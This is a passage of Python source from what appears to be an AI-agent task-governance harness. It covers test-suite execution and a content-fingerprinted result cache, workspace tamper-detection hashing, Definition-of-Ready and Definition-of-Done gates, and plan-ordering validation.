    return [sys.executable, "-c", _CHECKOUT_PYTHON_TRAMPOLINE,
            os.path.realpath(workspace),
            os.path.dirname(os.path.realpath(__file__)), *list(args)]


def _checkout_bound_main(workspace: str, args) -> None:
    """Execute Python argv with a checkout namespace, transitively.

    Tests and regression probes legitimately start nested Python/pytest
    processes. They must inherit the same checkout boundary instead of
    falling back to an unrelated editable install from system site-packages.
    Intercepting only explicit Python argv keeps ordinary subprocesses and
    shell commands byte-for-byte unchanged.
    """
    import importlib.machinery
    import runpy
    import types

    root = os.path.realpath(workspace)
    python_args = list(args or ())
    package_path = os.path.join(root, "taskplane")
    package = types.ModuleType("taskplane")
    package.__package__ = "taskplane"
    package.__path__ = [package_path]
    package.__spec__ = importlib.machinery.ModuleSpec(
        "taskplane", loader=None, is_package=True)
    package.__spec__.submodule_search_locations = package.__path__
    sys.modules["taskplane"] = package
    # Reprioritize checkout paths even when PYTHONPATH already contains them.
    sys.path[:] = [p for p in sys.path if p not in (root, package_path)]
    sys.path[:0] = [root, package_path]

    original_popen = subprocess.Popen

    def checkout_popen(command, *popen_args, **popen_kwargs):
        if isinstance(command, (list, tuple)) and command and \
                _python_program(command[0]):
            command = _checkout_bound_python_args(root, command[1:])
        return original_popen(command, *popen_args, **popen_kwargs)

    subprocess.Popen = checkout_popen
    if not python_args:
        raise SystemExit("checkout-bound Python command is empty")
    if python_args[0] == "-m" and len(python_args) >= 2:
        module = python_args[1]
        sys.argv = [module, *python_args[2:]]
        runpy.run_module(module, run_name="__main__", alter_sys=True)
    elif python_args[0] == "-c" and len(python_args) >= 2:
        sys.argv = ["-c", *python_args[2:]]
        exec(compile(python_args[1], "<string>", "exec"),
             {"__name__": "__main__"})
    else:
        script = python_args[0]
        if not os.path.isabs(script):
            script = os.path.join(root, script)
        sys.argv = [script, *python_args[1:]]
        runpy.run_path(script, run_name="__main__")


def _checkout_bound_python_argv(workspace: str, command: str) -> "list | None":
    """Translate one plain Python suite command to the current interpreter.

    The checkout intentionally has no ``taskplane/__init__.py``. A globally
    installed regular package would therefore beat the checkout namespace.
    The bootstrap pins that namespace in-process without PATH aliases,
    PYTHONPATH shims, or a machine-specific interpreter name.
    """
    try:
        lexer = shlex.shlex(str(command or ""), posix=True,
                           punctuation_chars="|&;<>")
        lexer.whitespace_split = True
        lexer.commenters = ""
        tokens = list(lexer)
    except ValueError:
        return None
    if not tokens or any(token and set(token) <= set("|&;<>")
                         for token in tokens):
        return None
    if not _python_program(tokens[0]):
        return None
    if len(tokens) < 2:
        return None
    return _checkout_bound_python_args(workspace, tokens[1:])


def run_suite_command(workspace: str, command, *, env=None,
                      timeout: int = 600):
    """Run a declared suite portably while retaining its original identity."""
    if isinstance(command, (list, tuple)):
        argv = (_checkout_bound_python_args(workspace, command[1:])
                if command and _python_program(command[0]) else list(command))
        return _run(argv, cwd=workspace, shell=False,
                    timeout=timeout, env=env)
    argv = _checkout_bound_python_argv(workspace, command)
    if argv is not None:
        return _run(argv, cwd=workspace, shell=False,
                    timeout=timeout, env=env)
    return _run(command, cwd=workspace, shell=True,
                timeout=timeout, env=env)


def plan_test_command_errors(command) -> list[str]:
    """Validate the unambiguous plan-level DoD command shape.

    ``run_suite_command`` deliberately supports argv lists for internal API
    callers, but ``plan/tasks.json`` used the same field for a command and
    looked like it accepted a list of test files/commands. Those three shapes
    cannot be distinguished reliably. Plans therefore have one canonical
    representation: a non-empty command string. Reject ambiguity while the
    plan is still editable, before human approval freezes it into loop state.
    """
    if not isinstance(command, str):
        return [
            'tests must be one command string, not a list/argv value; use '
            'e.g. "python3 -m pytest tests/ -q"'
        ]
    if not command.strip():
        return ["test command is missing"]
    try:
        shlex.split(command)
    except ValueError as exc:
        return [f"tests command has invalid quoting: {exc}"]
    return []


# ------------------------------------------------- suite result cache (P1)
#
# THE PERFORMANCE REGRESSION THIS CLOSES (measured, month-1 → phase 3): the
# DoD test command was executed once per *caller* instead of once per *tree
# state*. Phase 3 ran the full suite 161 times for ten tasks — about six
# executions per agent run — because every executor, evaluator, fixer and
# gate re-ran byte-identical content to produce evidence another agent had
# produced minutes earlier.
#
# WHY THIS IS NOT A WEAKENING. A hit requires the SAME command to have
# already run to completion over BYTE-IDENTICAL governed content under the
# SAME engine and the SAME governing env. Nothing is assumed, skipped, or
# taken on an agent's word — and a hit is a recorded, auditable fact in the
# trace, where "I ran the tests" is narration no gate can verify. Failures
# cache exactly like passes: a broken tree stays broken until its content
# changes, and changed content is a different key.
#
# FAIL-CLOSED IN EVERY DIRECTION. Any doubt about the tree's identity (no
# git, a git error, an untracked payload too large to hash honestly) returns
# None and the command RUNS. Cache read/write errors degrade to a real run.
# No path reports an unverified tree as clean.

SUITE_CACHE_MAX_UNTRACKED_BYTES = 32 * 1024 * 1024

# Volatile records authored by the harness itself between delivery stages.
# This is intentionally narrower than RUNTIME_OWNED below: plan/, docs/ and
# requirements/ can be governed task outputs whose changes must invalidate a
# suite result, even though the scope checker treats them as loop-owned.
SUITE_CACHE_VOLATILE = (
    ".taskplane/", ".taskplane_output.json", "knowledge/", ".eval/",
    ".em-review/", ".security-review/", ".tp-work/", ".taskplane-kb/",
)

# Stable, explicit inputs that can legitimately change suite behaviour.
# Orchestration identity (TASKPLANE_TASK, CODEX_THREAD_ID, host sessions,
# artifact stores) is deliberately absent: native executor and evaluator
# tasks must cite the same content-bound run.
SUITE_CACHE_ENV_KEYS = frozenset({
    "CI", "LANG", "LC_ALL", "TZ",
    "PYTHONHASHSEED", "PYTHONPATH", "PYTHONUTF8", "PYTHONIOENCODING",
    "PYTEST_ADDOPTS", "PYTEST_PLUGINS",
    "TASKPLANE_ENFORCE_DISPATCH", "TASKPLANE_PUBLISH_REVIEW",
    "TASKPLANE_QA_BASELINE",
})

_TRANSPORT_SHIM_AST = ast.dump(ast.parse(
    "from pathlib import Path\n"
    "__path__ = [str(Path.cwd() / 'taskplane')]\n"),
    include_attributes=False)


def _transport_only_pythonpath_entry(workspace: str, entry: str) -> bool:
    """Recognize the exact checkout-local namespace shim used by gates.

    A random PYTHONPATH remains test-affecting identity. Only a directory
    containing the single inert ``taskplane/__init__.py`` adapter whose AST
    points imports at ``cwd/taskplane`` is transport plumbing and may be
    omitted so a native evaluator can cite the producer's run.
    """
    if not str(entry or "").strip():
        return False
    root = entry if os.path.isabs(entry) else os.path.join(workspace, entry)
    root = os.path.realpath(root)
    if not os.path.isdir(root) or os.path.islink(root):
        return False
    files, directories = [], []
    try:
        for directory, names, filenames in os.walk(root):
            for name in names:
                full = os.path.join(directory, name)
                if os.path.islink(full):
                    return False
                if name != "__pycache__":
                    directories.append(os.path.relpath(
                        full, root).replace(os.sep, "/"))
            names[:] = [name for name in names if name != "__pycache__"]
            if os.path.islink(directory):
                return False
            for filename in filenames:
                full = os.path.join(directory, filename)
                if os.path.islink(full):
                    return False
                files.append(os.path.relpath(full, root).replace(os.sep, "/"))
        if sorted(directories) != ["taskplane"] or \
                sorted(files) != ["taskplane/__init__.py"]:
            return False
        with open(os.path.join(root, "taskplane", "__init__.py"),
                  encoding="utf-8") as stream:
            tree = ast.parse(stream.read())
        return ast.dump(tree, include_attributes=False) == _TRANSPORT_SHIM_AST
    except (OSError, SyntaxError, ValueError):
        return False


def _suite_env_identity(workspace: str, env: dict) -> list[tuple[str, str]]:
    identity = []
    for key in sorted(env or {}):
        if key not in SUITE_CACHE_ENV_KEYS:
            continue
        value = str(env[key])
        if key == "PYTHONPATH":
            entries = [entry for entry in value.split(os.pathsep) if entry]
            entries = [entry for entry in entries
                       if not _transport_only_pythonpath_entry(workspace,
                                                               entry)]
            if not entries:
                continue
            value = os.pathsep.join(entries)
        identity.append((key, value))
    return identity


def tree_fingerprint(workspace: str) -> "str | None":
    """Content identity of a workspace tree: HEAD, the tracked diff against
    it, and every untracked non-ignored file's path and content.

    Two workspaces sharing a fingerprint hold byte-identical governed
    content, so a command's exit status on one is evidence for the other —
    which is what lets a parallel wave's worktrees share one suite result
    with the primary checkout instead of each recomputing it.

    Returns None whenever the tree cannot be identified with certainty;
    callers MUST treat None as uncacheable and run for real."""
    try:
        h = hashlib.sha256()
        head = _run(["git", "rev-parse", "HEAD"], cwd=workspace)
        if head.returncode != 0:
            return None
        h.update(b"head\0" + head.stdout.strip().encode())

        # Runtime evidence is deliberately outside the governed tree
        # identity.  The loop writes these paths between execute and
        # evaluate; including them makes a byte-identical product tree miss
        # the suite result it just produced.  Exclude the same runtime-owned
        # paths from tracked and untracked inputs so an audit artifact cannot
        # manufacture a test rerun (or a different cache key).
        excludes = []
        for prefix in SUITE_CACHE_VOLATILE:
            clean = prefix.rstrip("/")
            excludes.append(
                f":(exclude){clean}/**" if prefix.endswith("/")
                else f":(exclude){clean}")
        diff = _run(["git", "diff", "HEAD", "--", ".", *excludes],
                    cwd=workspace)
        if diff.returncode != 0:
            return None
        h.update(b"\0diff\0" + diff.stdout.encode("utf-8", "replace"))

        others = _run(["git", "ls-files", "--others", "--exclude-standard"],
                      cwd=workspace)
        if others.returncode != 0:
            return None
        budget = SUITE_CACHE_MAX_UNTRACKED_BYTES
        for rel in sorted(p for p in others.stdout.splitlines()
                          if p.strip() and not p.startswith(
                              SUITE_CACHE_VOLATILE)
                          and not _generated_diff_path(p)):
            full = os.path.join(workspace, rel)
            try:
                if os.path.islink(full) or not os.path.isfile(full):
                    continue
                budget -= os.path.getsize(full)
                if budget < 0:
                    return None    # too much to identify honestly → run it
                with open(full, "rb") as f:
                    body = hashlib.sha256(f.read()).hexdigest()
            except OSError:
                return None
            h.update(b"\0new\0" + rel.encode() + b"\0" + body.encode())
        return h.hexdigest()
    except Exception:
        return None


def _suite_cache_key(workspace: str, command, env: dict) -> "str | None":
    tree = tree_fingerprint(workspace)
    if not tree:
        return None
    h = hashlib.sha256()
    h.update(b"tree\0" + tree.encode())
    h.update(b"\0cmd\0" + str(command).encode())
    try:
        h.update(b"\0engine\0" + engine_fingerprint().encode())
        settings = _canonical_operational_settings(
            legacy_environment=True)
        h.update(b"\0settings\0" + settings.digest.encode())
    except Exception:
        return None            # can't bind evidence to an engine → run it
    for key, value in _suite_env_identity(workspace, env):
        h.update(b"\0env\0" + key.encode() + b"=" + value.encode())
    return h.hexdigest()


def _suite_cache_path(key: str) -> str:
    return os.path.join(store_home(), "suite-cache", key + ".json")


def suite_cache_enabled() -> bool:
    """Return the validated per-run cache policy from canonical settings."""
    return bool(_canonical_operational_settings().tests.cache)


# D-0008. `tests_pass` is the gate that says behaviour was verified, and a
# citation satisfies it with no test run. The key binds tree content, the
# command, the engine and a few env vars — everything the PRODUCT controls.
# It cannot bind what it does not see: the interpreter minor version, the
# installed package set, the OS libraries. Those drift, and the record
# carried a `ts` that nothing ever read, so a green result from months ago
# still discharged today's gate.
#
# A citation is therefore bounded in TIME as well as content. Inside the
# window it is what it claims to be — the same bytes verified minutes or
# hours ago, which is what makes a parallel wave cost one suite run instead
# of one per task. Outside it, the environment is no longer a safe
# assumption and the suite runs again.
def suite_cache_max_age() -> float:
    """Derive citation retention from the one artifact-retention policy."""
    return float(_canonical_operational_settings().cleanup.artifacts_days *
                 24 * 60 * 60)


def suite_cache_lookup(workspace: str, command, env: dict) -> "dict | None":
    """A prior result for this exact (tree, command, engine, env), or None.
    Never raises: any doubt returns None and the caller runs."""
    if not suite_cache_enabled():
        return None
    key = _suite_cache_key(workspace, command, env)
    if not key:
        return None
    try:
        with open(_suite_cache_path(key), encoding="utf-8") as f:
            rec = json.load(f)
    except Exception:
        return None
    if not isinstance(rec, dict) or "returncode" not in rec:
        return None
    if rec.get("command") != str(command) or rec.get("key") != key:
        return None            # corrupt or mismatched entry → run it
    max_age = suite_cache_max_age()
    try:
        age = _time.time() - float(rec.get("ts") or 0)
    except (TypeError, ValueError):
        return None            # undatable evidence is not evidence
    if max_age <= 0 or age > max_age:
        with _contextlib.suppress(Exception):
            trace(workspace, "suite_cache_stale", command=str(command),
                  age_s=round(age), max_age_s=max_age)
        return None            # too old to stand in for a run
    rec["age_s"] = round(age, 1)
    return rec


def suite_cache_store(workspace: str, command, env: dict, *,
                      returncode: int, tail: str, duration_s: float) -> None:
    """Record a completed run so the next caller over identical content can
    cite it. Best-effort: a write failure costs a re-run, never truth."""
    if not suite_cache_enabled():
        return
    key = _suite_cache_key(workspace, command, env)
    if not key:
        return
    try:
        atomic_write_json(_suite_cache_path(key), {
            "key": key, "command": str(command),
            "returncode": int(returncode), "tail": tail,
            "duration_s": round(float(duration_s), 3), "ts": _time.time(),
            "produced_in": _workspace_identity(workspace)})
    except Exception:
        return


# Paths the runtime/loop writes for itself. The DoD scope-diff must not
# count them as the task's out-of-scope changes — otherwise recording a KB
# decision or a plan would fail every governed task.
RUNTIME_OWNED = (".taskplane/", ".taskplane_output.json", "knowledge/",
                 "plan/", ".eval/", ".em-review/", ".security-review/",
                 ".tp-work/", ".taskplane-kb/",
                 # v2.3.0: authored by the loop's own earlier steps / init —
                 # a pm step writes specs/, init writes .gitignore, context
                 # docs land in context|docs|requirements/. Counting them as
                 # a later task's out-of-scope diff failed every execute gate
                 # in a serial journey.
                 "specs/", "docs/", "context/", "requirements/", ".gitignore")

_GENERATED_DIFF_DIRS = frozenset({
    "__pycache__", ".pytest_cache", ".mypy_cache", ".ruff_cache",
})


def _generated_diff_path(path: str) -> bool:
    """Universal interpreter/test caches are evidence noise, not product."""
    rel = str(path or "").replace("\\", "/")
    parts = [part for part in rel.split("/") if part]
    return (any(part in _GENERATED_DIFF_DIRS for part in parts)
            or rel.endswith((".pyc", ".pyo")))


def changed_files(workspace: str, snapshot_ref: str) -> list:
    diff = _run(["git", "diff", "--name-only", snapshot_ref], cwd=workspace)
    untracked = _run(["git", "ls-files", "--others", "--exclude-standard"],
                     cwd=workspace)
    files = [f for f in (diff.stdout + untracked.stdout).splitlines()
             if f and not f.startswith(RUNTIME_OWNED)
             and not _generated_diff_path(f)]
    return sorted(set(files))


def workspace_fingerprint(workspace: str, snapshot_ref: str | None = None,
                          extra_paths=None) -> str:
    """Stable evidence identity for the current governed change.

    Agent prose is never evidence.  A submission is bound to the baseline,
    changed paths, and the bytes currently present at those paths so the
    orchestrator can reject a gate when work changed after the worker
    submitted it.  Deleted paths and git metadata-only changes are represented
    explicitly; untracked files are included through ``changed_files``.
    """
    if not snapshot_ref:
        # L13 (v2.2.1): a None baseline used to hash to a CONSTANT,
        # silently disabling tamper detection. Fall back to git HEAD;
        # a workspace with neither has no attestable baseline.
        snapshot_ref = git_head(workspace)
        if not snapshot_ref:
            raise ValueError(
                "workspace_fingerprint needs a baseline: no contract "
                "snapshot and no git HEAD — commit first")
    h = hashlib.sha256()
    h.update(snapshot_ref.encode("utf-8"))
    entries = [(rel, os.path.join(workspace, rel))
               for rel in changed_files(workspace, snapshot_ref)]
    # Runtime-owned paths are deliberately excluded from source-scope DoD,
    # but evaluator/EM evidence must still be immutable between submit and
    # gate. Callers name those exact artifacts here; reject absolute/traversal
    # paths so the attestation never reads outside the governed workspace.
    for raw in extra_paths or []:
        raw = str(raw or "").strip()
        if os.path.isabs(raw):
            import storage as runtime_storage
            locator = runtime_storage.load_workspace_locator(workspace)
            resolved = os.path.realpath(raw)
            if not locator or not runtime_storage.managed_path_allowed(
                    workspace, resolved):
                continue
            for area, root in sorted(locator["paths"].items()):
                real_root = os.path.realpath(root)
                if os.path.commonpath((real_root, resolved)) == real_root:
                    suffix = os.path.relpath(resolved, real_root).replace(
                        os.sep, "/")
                    entries.append((f"@run/{area}/{suffix}", resolved))
                    break
            continue
        rel = raw.replace("\\", "/")
        if (not rel or rel == ".." or rel.startswith("../")
                or "/../" in rel):
            continue
        entries.append((rel, os.path.join(workspace, rel)))
    entries = sorted(set(entries))
    for rel, full in entries:
        h.update(b"\0path\0")
        h.update(rel.encode("utf-8", errors="surrogateescape"))
        try:
            st = os.lstat(full)
            h.update(f"\0mode:{st.st_mode:o}\0size:{st.st_size}\0".encode())
            if os.path.isfile(full) and not os.path.islink(full):
                with open(full, "rb") as f:
                    while True:
                        chunk = f.read(1024 * 1024)
                        if not chunk:
                            break
                        h.update(chunk)
            elif os.path.islink(full):
                h.update(b"symlink\0")
                h.update(os.readlink(full).encode("utf-8",
                                                   errors="surrogateescape"))
        except FileNotFoundError:
            h.update(b"\0deleted\0")
        except OSError as exc:
            # Fail deterministic rather than silently dropping a path from the
            # attestation.  The exact errno is enough to invalidate a later
            # submission once the path becomes readable again.
            h.update(f"\0unreadable:{exc.errno}\0".encode())
    return h.hexdigest()


def _porcelain_path(ln: str) -> str:
    """The path out of a `git status --porcelain` line — strips the 2-char
    status + space prefix and unwraps a rename's `old -> new` to `new`."""
    path = ln[3:] if len(ln) > 3 else ln.strip()
    if " -> " in path:
        path = path.split(" -> ", 1)[1]
    return path.strip().strip('"')


def is_dirty(workspace: str) -> list:
    """Uncommitted files at start (excluding taskplane's own runtime state).

    Filters on the PATH, not the raw porcelain line — the 2-char status +
    space prefix (`?? knowledge/x`) otherwise offsets every RUNTIME_OWNED
    startswith check so runtime-owned files wrongly count as dirty and can
    falsely block a pass gate."""
    r = _run(["git", "status", "--porcelain"], cwd=workspace)
    out = []
    for ln in r.stdout.splitlines():
        if not ln.strip():
            continue
        path = _porcelain_path(ln)
        if path.startswith(RUNTIME_OWNED) or _generated_diff_path(path):
            continue
        out.append(ln)
    return out


def dor_check(contract: dict, workspace: str,
              snapshot_ref: str | None) -> tuple[bool, list, list]:
    """Definition of Ready — the ENTRY gate, run before work starts.

    Returns (ready, blockers, warnings). Blockers mean the task cannot be
    governed meaningfully yet; warnings are advisable-to-fix but not fatal.
    Symmetric with dod_check (the EXIT gate).
    """
    blockers: list = []
    warnings: list = []
    coding = contract.get("coding") or {}
    scope = coding.get("scope_paths") or []
    dod = coding.get("dod") or {}
    read_only = bool(contract.get("read_only"))

    if not (contract.get("task") or "").strip():
        blockers.append("no task statement — what is this task allowed to do?")
    if not scope and not read_only:
        blockers.append("scope_paths is empty — everything would be writable; "
                        "set --scope so the boundary means something "
                        "(or --read-only for a review/plan task)")
    if (not read_only and dod.get("require_clean_scope_diff", True)
            and snapshot_ref is None):
        blockers.append("no git snapshot — not a repo or no commit; the DoD "
                        "scope-diff can't verify later. Run `git init && git "
                        "add -A && git commit -m init` in the workspace")

    if read_only:
        # A review/plan task writes nothing, so scope/snapshot/test blockers
        # don't apply — only a missing task statement keeps it NOT READY.
        kept = [b for b in blockers if "task statement" in b]
        return (not kept), kept, warnings

    if not dod.get("test_command"):
        blockers.append("no DoD test_command — behavior cannot be verified; "
                        "set --tests before execution")
    if any(g in ("**", "*", "**/*", "./**") for g in scope):
        warnings.append("scope includes a catch-all glob — governance is weak; "
                        "narrow it to the paths this task really needs")
    if snapshot_ref is not None:
        dirty = is_dirty(workspace)
        if dirty:
            warnings.append(f"{len(dirty)} uncommitted file(s) already in the "
                            "tree — they will count against the DoD diff; "
                            "commit or stash them before starting")

    return (not blockers), blockers, warnings


def dod_check(contract: dict, workspace: str,
              snapshot_ref: str | None,
              ignore_prefixes: tuple = (),
              regression_files=None,
              notices: list | None = None,
              suite_evidence: dict | None = None) -> list:
    """Return a list of DoD errors ([] = pass). Fails closed if a scope
    diff is required but no snapshot exists.

    `notices` (D-0008): pass a list to receive non-blocking facts a human
    should see before signing off — today, that `tests_pass` was satisfied
    by CITING an identical-content run rather than executing one. That fact
    lived only in the trace, which nobody reads at a gate. Optional so the
    four existing callers are unchanged; the ones a human reads pass it.

    ignore_prefixes (A2, R-0007): path prefixes EXCLUDED from the scope
    diff. Default () — non-loop callers are unchanged. The loop's per-task
    DoD passes lens.LOOP_OWNED so orchestrator-synced loop artifacts
    (design/, plan/, specs/, ...) don't trip every task gate — parity with
    the sign-off aggregate's exclusion (loop._signoff_dod)."""
    errors: list = []
    coding = contract.get("coding") or {}
    dod = coding.get("dod") or {}
    try:
        test_timeout_seconds = validate_test_timeout_seconds(
            dod.get("test_timeout_seconds", int(
                _canonical_operational_settings().limits.timeouts[
                    "task_seconds"])),
            field="coding.dod.test_timeout_seconds",
            plan_minted=bool(coding.get("plan_minted")))
    except ValueError as exc:
        test_timeout_seconds = None
        errors.append(str(exc))

    if dod.get("require_clean_scope_diff", True) and coding.get("scope_paths"):
        if not snapshot_ref:
            errors.append("diff_scope: cannot verify — no git snapshot "
                          "(commit the workspace before governing)")
        else:
            for f in changed_files(workspace, snapshot_ref):
                # NOTE (pre-existing, not changed here): a slash-less
                # prefix like '.taskplane' also matches SIBLING dirs
                # ('.taskplane-kb/…'); lens.LOOP_OWNED's shape predates
                # this diff — the aggregate filter has always matched so.
                if ignore_prefixes and f.startswith(tuple(ignore_prefixes)):
                    continue          # A2: loop-owned artifacts, see above
                p = f  # already workspace-relative from git
                v = scope_violation(p, coding)
                if v:
                    errors.append("diff_scope: " + v)
            if any(e.startswith("diff_scope:") for e in errors):
                # Name the recovery path (v2.3.0) — it existed but was
                # stated nowhere: committing alone does NOT clear the gate
                # because the contract snapshot predates the commit.
                errors.append(
                    "diff_scope recovery: if these files were authored by an "
                    "earlier loop step (specs, plan, docs, .gitignore), "
                    "commit them, re-run `loop next` to refresh the contract "
                    "snapshot, then submit and gate again; otherwise revert "
                    "them or widen the task's scope via the human gate")

    tc = dod.get("test_command")
    declared_suite_passed = False
    suite_launch_failed = False
    if tc and test_timeout_seconds is not None:
        # A3 (R-0007): strip the wave slot from the CHILD env only — a gate
        # run under TASKPLANE_TASK=<slot> must not leak the slot into the
        # DoD test subprocess (slot-sensitive tests would resolve the
        # GATE's contract, not their own). The parent env is untouched.
        env = {k: v for k, v in os.environ.items() if k != "TASKPLANE_TASK"}
        suite_key = _suite_cache_key(workspace, tc, env)
        # P1: cite a completed run over byte-identical content instead of
        # recomputing it. Same command, same bytes, same engine, same env —
        # or it runs. Every hit is traced, so the evidence stays auditable.
        hit = suite_cache_lookup(workspace, tc, env)
        if hit is not None:
            declared_suite_passed = int(hit.get("returncode")) == 0
            if suite_evidence is not None:
                suite_evidence.update({
                    "schema": "taskplane.suite-evidence/v1",
                    "command": str(tc), "key": hit.get("key"),
                    "returncode": int(hit.get("returncode")),
                    "tail": str(hit.get("tail") or ""),
                    "duration_s": hit.get("duration_s"),
                    "source": "suite-cache",
                })
            trace(workspace, "suite_cache_hit", command=str(tc),
                  key=hit.get("key"), returncode=hit.get("returncode"),
                  seconds_saved=hit.get("duration_s"),
                  produced_in=hit.get("produced_in"))
            if notices is not None:
                where = hit.get("produced_in")
                notices.append(
                    f"tests_pass: '{tc}' was CITED, not executed — an "
                    f"identical-content run {int(hit.get('age_s') or 0)}s ago"
                    + (f" in {where}" if where else "")
                    + f" (exit {hit.get('returncode')}). Same bytes, same "
                    "engine. Set TASKPLANE_NO_SUITE_CACHE=1 to force "
                    "execution.")
            if hit.get("returncode") != 0:
                errors.append(f"tests_pass: '{tc}' exited "
                              f"{hit.get('returncode')}: {hit.get('tail')} "
                              "(cited from an identical-content run — change "
                              "the tree or set TASKPLANE_NO_SUITE_CACHE=1 to "
                              "re-execute)")
        else:
            _t0 = _time.time()
            try:
                proc = run_suite_command(
                    workspace, tc, env=env,
                    timeout=test_timeout_seconds)
            except (OSError, subprocess.SubprocessError,
                    TypeError, ValueError) as exc:
                suite_launch_failed = True
                errors.append(
                    f"tests_pass: could not start {tc!r} "
                    f"({exc.__class__.__name__}: {exc}). The declared test "
                    "command is invalid or unavailable; correct it through "
                    "the governed `tp loop replan --by <human> --reason "
                    "<why>` path. The gate did not advance.")
                trace(workspace, "suite_run_failed_to_start", command=str(tc),
                      error=f"{exc.__class__.__name__}: {exc}")
            else:
                _elapsed = _time.time() - _t0
                tail = " | ".join(
                    (proc.stdout + proc.stderr).strip().splitlines()[-5:])
                suite_cache_store(
                    workspace, tc, env, returncode=proc.returncode,
                    tail=tail, duration_s=_elapsed)
                trace(workspace, "suite_run", command=str(tc),
                      returncode=proc.returncode, seconds=round(_elapsed, 2))
                if suite_evidence is not None:
                    suite_evidence.update({
                        "schema": "taskplane.suite-evidence/v1",
                        "command": str(tc), "key": suite_key,
                        "returncode": int(proc.returncode), "tail": tail,
                        "duration_s": round(_elapsed, 3),
                        "source": "execute-gate",
                    })
                declared_suite_passed = proc.returncode == 0
                if proc.returncode != 0:
                    errors.append(
                        f"tests_pass: '{tc}' exited {proc.returncode}: "
                        + tail)

    # Graph-scoped regression gate (v2.3.1) — selected by the contract.
    # ADDITIVE: it only adds blockers, never removes an existing DoD check.
    # General-purpose callers can opt in; every governed coding and sign-off
    # contract created by the loop enables it mechanically.
    if dod.get("regression_gate") and snapshot_ref and not suite_launch_failed:
        try:
            import regression as _rg
            changed = (list(regression_files) if regression_files is not None
                       else changed_files(workspace, snapshot_ref))
            graph_impacted = None
            try:
                import depgraph as _dg
                graph_impacted = _dg.impact(
                    workspace, changed).get("impacted") or None
            except Exception:
                graph_impacted = None      # sparse/absent graph → import-map only
            # The approved task suite is the task-level behavioral proof. If
            # it is green for these exact bytes, running a second current +
            # detached-baseline pytest radius in the same gate duplicates
            # work and can widen a focused task into a repository-wide run.
            # Keep Tier 2's cheap coverage-gap check, but defer Tier 1 to the
            # plan's final CI-equivalent task. A missing/failed suite still
            # gets the full differential regression check.
            regression_snapshot = (None if declared_suite_passed
                                   else snapshot_ref)
            if declared_suite_passed:
                trace(workspace, "regression_gate_coverage_only",
                      command=str(tc), reason="declared_suite_passed")
            errors.extend(_rg.dod_errors(
                workspace, regression_snapshot, changed, graph_impacted,
                test_command=tc))
        except Exception as e:
            # The gate must never crash the DoD it guards — degrade visibly.
            errors.append(f"regression_gate: could not run ({e.__class__.__name__}"
                          f": {e}); re-run or disable dod.regression_gate")
    return errors


# ----------------------------------------------------------- plan ordering

# B2 (R-0008): brief-SHAPE surfaces vs golden-brief fixtures. A task that
# changes how stage/review briefs are emitted (lens routing, signal
# detectors, the tp.py dispatch/emission layer) must run BEFORE any task
# that regenerates the golden brief fixtures — otherwise the regenerated
# goldens pin the OLD shape (the Phase 2 t6∥t7 sequencing gap, retro
# lesson 1). The plan gate enforces this mechanically; planner memory is
# not a control.
BRIEF_SHAPE_SURFACES = ("taskplane/lens.py", "taskplane/lens_signals.py",
                        "taskplane/tp.py")
GOLDEN_PREFIX = "taskplane/tests/fixtures/briefs/"


def _scope_touches(scope, target: str) -> bool:
    """Glob/prefix intersection: does any scope glob reach `target` (a
    literal file, or a directory prefix ending in '/')? Stem matching (the
    text before the first wildcard), in BOTH directions, so `taskplane/**`
    covers lens.py and a literal fixture path counts as touching the
    fixture dir. A catch-all glob ('**') touches everything — the strict
    direction."""
    for g in scope or []:
        stem = str(g).replace("\\", "/").split("*", 1)[0]
        if target.startswith(stem) or stem.startswith(target):
            return True
    return False


def plan_ordering_errors(tasks) -> list:
    """B2: every task whose scope touches a BRIEF_SHAPE_SURFACES file must
    be a TRANSITIVE dependency ancestor of every task whose scope touches
    GOLDEN_PREFIX. Returns refusal strings naming both offending task
    ids ([] = ordered). Fail-closed: any unordered pair refuses the plan
    approval — an under-declared dep is a plan bug, not a warning."""
    tasks = [t for t in tasks or [] if isinstance(t, dict)]
    shape = [t for t in tasks
             if any(_scope_touches(t.get("scope"), s)
                    for s in BRIEF_SHAPE_SURFACES)]
    golden = [t for t in tasks
              if _scope_touches(t.get("scope"), GOLDEN_PREFIX)]

    # DISJOINTNESS (EM, v3 phase 3). _scope_touches matches stems in BOTH
    # directions, which is what lets a broad scope be caught at all — but it
    # also made a CATCH-ALL scope ('**', 'taskplane/**') land in both sets at
    # once. Two such tasks then demanded that each depend on the other: an
    # unsatisfiable cycle that dead-ended plan approval, with no --force
    # path and a remedy line naming the one fix that cannot work.
    #
    # A task in BOTH sets carries both halves itself and is self-ordered by
    # its own execution — exactly what the bid == gid branch below already
    # recognised for the single-task case. Generalise it: a both-task
    # imposes no cross-task ordering, and none is imposed on it. The Phase 2
    # gap this gate exists for (t6 shape ∥ t7 golden-regen, two DISJOINT
    # scopes) is still caught, because those tasks are each in one set only.
    both = {str(t.get("id")) for t in shape} & {str(t.get("id"))
                                                for t in golden}
    shape = [t for t in shape if str(t.get("id")) not in both]
    golden = [t for t in golden if str(t.get("id")) not in both]
    if not shape or not golden:
        return []
    deps = {str(t.get("id")): [str(d) for d in t.get("deps") or []]
            for t in tasks}

    def ancestors(tid: str, seen: set) -> set:
        for d in deps.get(tid, []):
            if d not in seen:
                seen.add(d)
                ancestors(d, seen)
        return seen

    errors = []
    for g in golden:
        gid = str(g.get("id"))
        anc = ancestors(gid, set())
        for b in shape:
            bid = str(b.get("id"))
            if bid == gid or bid in anc:
                continue     # ordered (or the same task carries both)
            errors.append(
                f"plan ordering: task {gid} touches {GOLDEN_PREFIX}** "
                f"(golden brief regen) but does not depend — transitively — "
                f"on brief-shape task {bid}; order brief-shape changes "
                "before golden regeneration. Remedies, in preference order: "
                f"add {bid} to {gid}'s deps; or narrow the scopes so only "
                "the task that really changes brief shape reaches "
                + ", ".join(BRIEF_SHAPE_SURFACES) +
                f"; or merge both halves into one task. There is "
                "deliberately no --force past this: regenerating goldens "
                "against the OLD brief shape pins the bug into the fixtures, "
                "and the plan is still free to edit at this gate")
    return errors


def plan_task_id_errors(tasks) -> list:
    """E5 remedy (Phase 3 EM review): every task id BECOMES a per-task
    contract slot (TASKPLANE_TASK) and is interpolated into the composed
    workflow dispatch line, so an id outside the enforced slot charset
    bricks the workflow rail at execute/evaluate/fix — AFTER the human
    plan-approval gate, where the only remedy is renaming ids in
    plan/tasks.json and re-planning + re-approving.

    Catch it at the plan gate instead, where editing plan/tasks.json is
    free and pre-approval. Same regex as `task_slot`'s (_TASK_SLOT_RE):
    ONE enforced charset, never a second that could drift from it.
    Returns refusal strings naming every offending id ([] = usable)."""
    errors = []
    for t in tasks or []:
